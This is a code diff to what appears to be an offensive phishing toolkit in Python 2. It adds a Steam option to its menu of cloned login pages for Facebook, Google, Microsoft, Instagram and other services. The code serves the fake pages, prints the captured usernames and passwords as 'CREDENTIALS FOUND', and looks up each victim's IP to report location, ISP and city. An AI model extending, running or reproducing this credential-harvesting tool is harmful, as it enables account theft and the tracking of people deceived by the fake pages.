@@ -106,7 +106,9 @@ def runPhishing(social, option2):
     elif social == 'Twitch':
         copy_tree("WebPages/twitch/", "Server/www/")
     elif social == 'Microsoft':
-        copy_tree("WebPages/live_web/", "Server/www/")	
+        copy_tree("WebPages/live_web/", "Server/www/")
+    elif social == 'Steam':
+        copy_tree("WebPages/steam/", "Server/www/")
     elif option2 == '1' and social == 'Instagram':
         copy_tree("WebPages/Instagram_web/", "Server/www/")    
     elif option2 == '2' and social == 'Instagram':
@@ -135,10 +137,10 @@ def waitCreds():
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            print '======================================================================'.format(RED, END)
+            print '=================================================='.format(RED, END)
             print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
             system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
-            print '======================================================================'.format(RED, END)
+            print '=================================================='.format(RED, END)
             print ' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END)
             
         creds.close()
@@ -153,13 +155,13 @@ def waitCreds():
             matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
             latitude = matchObj.group(1)
             longitude = matchObj.group(2)
-            print '======================================================================'.format(RED, END)
+            print '=================================================='.format(RED, END)
             print ' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
             print ' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, END) % (longitude, latitude)
             print ' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country'])
             print ' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city'])
             system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
-            print '======================================================================'.format(RED, END)
+            print '=================================================='.format(RED, END)
             
         creds.close()
         
@@ -199,7 +201,7 @@ def runPEnv():
         system('clear')
         print '\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU NEED A GOOD MIND AND SOUL TO BE ONE OF US. GET AWAY FROM HERE AND DO NOT COME BACK WITH SAME MOTIVE. GOOD BYE!{1} ]\n'.format(RED, END)
         exit(0)
-    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, END))
+    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, END))
     if option == '1':
         loadModule('Facebook')
         option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
@@ -247,7 +249,11 @@ def runPEnv():
     elif option == '12':
         loadModule('Microsoft')
         option2 = ''
-        runPhishing('Microsoft', option2)	
+        runPhishing('Microsoft', option2)
+    elif option == '13':
+        loadModule('Steam')
+        option2 = ''
+        runPhishing('Steam', option2)
     else:
         exit(0)
 
